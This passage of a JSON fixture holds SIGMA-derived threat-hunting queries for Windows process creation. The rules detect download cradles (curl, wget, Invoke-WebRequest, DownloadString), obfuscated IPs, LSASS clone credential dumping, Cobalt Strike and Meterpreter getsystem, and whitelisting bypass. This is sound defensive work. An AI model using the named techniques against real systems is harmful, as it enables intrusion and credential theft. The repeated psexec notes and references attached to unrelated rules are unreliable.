            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1059",
                "t1105"
            ],
            "name": "Command Line Execution with Suspicious URL and AppData Strings",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\cmd.exe\" and (tgt.process.cmdline contains \"http\" and tgt.process.cmdline contains \"://\" and tgt.process.cmdline contains \"%AppData%\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 624
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a ping command that uses a hex encoded IP address",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1140",
                "t1027"
            ],
            "name": "Ping Hex IP",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ping.exe\" and tgt.process.cmdline contains \"0x\")) | columns src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 625
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105",
                "t1608"
            ],
            "name": "Suspicious Download from Office Domain",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\wget.exe\") or (tgt.process.cmdline contains \"Invoke-WebRequest\" or tgt.process.cmdline contains \"iwr \" or tgt.process.cmdline contains \"curl \" or tgt.process.cmdline contains \"wget \" or tgt.process.cmdline contains \"Start-BitsTransfer\" or tgt.process.cmdline contains \".DownloadFile(\" or tgt.process.cmdline contains \".DownloadString(\")) and (tgt.process.cmdline contains \"https://attachment.outlook.live.net/owa/\" or tgt.process.cmdline contains \"https://onenoteonlinesync.onenote.com/onenoteonlinesync/\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 626
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Taskmgr as LOCAL_SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\") and tgt.process.image.path contains \"\\taskmgr.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 627
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of a browser process with a URL argument pointing to a file with a potentially interesting extension. This can be abused to download arbitrary files or to hide from the user for example by launching the browser in a minimized state.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "File Download From Browser Process Via Inline URL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"http\" and (tgt.process.cmdline contains \".7z\" or tgt.process.cmdline contains \".dat\" or tgt.process.cmdline contains \".dll\" or tgt.process.cmdline contains \".exe\" or tgt.process.cmdline contains \".hta\" or tgt.process.cmdline contains \".ps1\" or tgt.process.cmdline contains \".psm1\" or tgt.process.cmdline contains \".txt\" or tgt.process.cmdline contains \".vbe\" or tgt.process.cmdline contains \".vbs\" or tgt.process.cmdline contains \".zip\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 628
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Sysprep on AppData Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sysprep.exe\" and tgt.process.cmdline contains \"\\AppData\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 629
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a WMI backdoor in Exchange Transport Agents via WMI event filters",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "WMI Backdoor Exchange Transport Agent",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\EdgeTransport.exe\" and (not (tgt.process.image.path=\"C:\\Windows\\System32\\conhost.exe\" or (tgt.process.image.path contains \"C:\\Program Files\\Microsoft\\Exchange Server\\\" and tgt.process.image.path contains \"\\Bin\\OleConverter.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 630
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of an encoded/obfuscated version of an IP address (hex, octal, etc.) via command line",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Obfuscated IP Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\ping.exe\" or tgt.process.image.path contains \"\\arp.exe\") and ((tgt.process.cmdline contains \" 0x\" or tgt.process.cmdline contains \"//0x\" or tgt.process.cmdline contains \".0x\" or tgt.process.cmdline contains \".00x\") or (tgt.process.cmdline contains \"http://%\" and tgt.process.cmdline contains \"%2e\") or (tgt.process.cmdline matches \"https?://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.0[0-9]{3,4}\" or tgt.process.cmdline matches \"https?://[0-9]{1,3}\\\\.0[0-9]{3,7}\" or tgt.process.cmdline matches \"https?://0[0-9]{3,11}\" or tgt.process.cmdline matches \"https?://(0[0-9]{1,11}\\\\.){3}0[0-9]{1,11}\" or tgt.process.cmdline matches \"https?://0[0-9]{1,11}\" or tgt.process.cmdline matches \" [0-7]{7,13}\")) and (not tgt.process.cmdline matches \"https?://((25[0-5]|(2[0-4]|1\\\\d|[1-9])?\\\\d)(\\\\.|\\\\b)){4}\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 631
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Usage Of Web Request Commands And Cmdlets",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"[System.Net.WebRequest]::create\" or tgt.process.cmdline contains \"curl \" or tgt.process.cmdline contains \"Invoke-RestMethod\" or tgt.process.cmdline contains \"Invoke-WebRequest\" or tgt.process.cmdline contains \"iwr \" or tgt.process.cmdline contains \"Net.WebClient\" or tgt.process.cmdline contains \"Resume-BitsTransfer\" or tgt.process.cmdline contains \"Start-BitsTransfer\" or tgt.process.cmdline contains \"wget \" or tgt.process.cmdline contains \"WinHttp.WinHttpRequest\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 632
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087"
            ],
            "name": "HackTool - SOAPHound Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" --buildcache \" or tgt.process.cmdline contains \" --bhdump \" or tgt.process.cmdline contains \" --certdump \" or tgt.process.cmdline contains \" --dnsdump \") and (tgt.process.cmdline contains \" -c \" or tgt.process.cmdline contains \" --cachefilename \" or tgt.process.cmdline contains \" -o \" or tgt.process.cmdline contains \" --outputdirectory\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 633
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious LSASS process process clone that could be a sign of credential dumping activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003",
                "t1003"
            ],
            "name": "Potential Credential Dumping Via LSASS Process Clone",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\Windows\\System32\\lsass.exe\" and tgt.process.image.path contains \"\\Windows\\System32\\lsass.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 634
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1134",
                "t1134"
            ],
            "name": "Potential Meterpreter/CobaltStrike Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\services.exe\" and (((tgt.process.cmdline contains \"/c\" and tgt.process.cmdline contains \"echo\" and tgt.process.cmdline contains \"\\pipe\\\") and (tgt.process.cmdline contains \"cmd\" or tgt.process.cmdline contains \"%COMSPEC%\")) or (tgt.process.cmdline contains \"rundll32\" and tgt.process.cmdline contains \".dll,a\" and tgt.process.cmdline contains \"/p:\")) and (not tgt.process.cmdline contains \"MpCmdRun\"))) | columns ComputerName,tgt.process.user,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 635
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"winrm\" and ((tgt.process.cmdline contains \"format:pretty\" or tgt.process.cmdline contains \"format:\\\"pretty\\\"\" or tgt.process.cmdline contains \"format:\\\"text\\\"\" or tgt.process.cmdline contains \"format:text\") and (not (tgt.process.image.path contains \"C:\\Windows\\System32\\\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 636
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when the Console Window Host (conhost.exe) process is spawned by an uncommon parent process, which could be indicative of potential code injection activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Conhost Spawned By Uncommon Parent Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\conhost.exe\" and (src.process.image.path contains \"\\explorer.exe\" or src.process.image.path contains \"\\lsass.exe\" or src.process.image.path contains \"\\regsvr32.exe\" or src.process.image.path contains \"\\rundll32.exe\" or src.process.image.path contains \"\\services.exe\" or src.process.image.path contains \"\\smss.exe\" or src.process.image.path contains \"\\spoolsv.exe\" or src.process.image.path contains \"\\svchost.exe\" or src.process.image.path contains \"\\userinit.exe\" or src.process.image.path contains \"\\wininit.exe\" or src.process.image.path contains \"\\winlogon.exe\")) and (not (src.process.cmdline contains \"-k apphost -s AppHostSvc\" or src.process.cmdline contains \"-k imgsvc\" or src.process.cmdline contains \"-k localService -p -s RemoteRegistry\" or src.process.cmdline contains \"-k LocalSystemNetworkRestricted -p -s NgcSvc\" or src.process.cmdline contains \"-k NetSvcs -p -s NcaSvc\" or src.process.cmdline contains \"-k netsvcs -p -s NetSetupSvc\" or src.process.cmdline contains \"-k netsvcs -p -s wlidsvc\" or src.process.cmdline contains \"-k NetworkService -p -s DoSvc\" or src.process.cmdline contains \"-k wsappx -p -s AppXSvc\" or src.process.cmdline contains \"-k wsappx -p -s ClipSVC\")) and (not (src.process.cmdline contains \"C:\\Program Files (x86)\\Dropbox\\Client\\\" or src.process.cmdline contains \"C:\\Program Files\\Dropbox\\Client\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 637
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect suspicious parent processes of well-known Windows processes",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1036"
            ],
            "name": "Windows Processes Suspicious Parent Directory",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\svchost.exe\" or tgt.process.image.path contains \"\\taskhost.exe\" or tgt.process.image.path contains \"\\lsm.exe\" or tgt.process.image.path contains \"\\lsass.exe\" or tgt.process.image.path contains \"\\services.exe\" or tgt.process.image.path contains \"\\lsaiso.exe\" or tgt.process.image.path contains \"\\csrss.exe\" or tgt.process.image.path contains \"\\wininit.exe\" or tgt.process.image.path contains \"\\winlogon.exe\") and (not (((src.process.image.path contains \"\\SavService.exe\" or src.process.image.path contains \"\\ngen.exe\") or (src.process.image.path contains \"\\System32\\\" or src.process.image.path contains \"\\SysWOW64\\\")) or ((src.process.image.path contains \"\\Windows Defender\\\" or src.process.image.path contains \"\\Microsoft Security Client\\\") and src.process.image.path contains \"\\MsMpEng.exe\") or (not (src.process.image.path matches \"\\.*\") or src.process.image.path=\"-\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 638
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1615"
            ],
            "name": "Gpresult Display Group Policy Information",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\gpresult.exe\" and (tgt.process.cmdline contains \"/z\" or tgt.process.cmdline contains \"/v\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 639
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
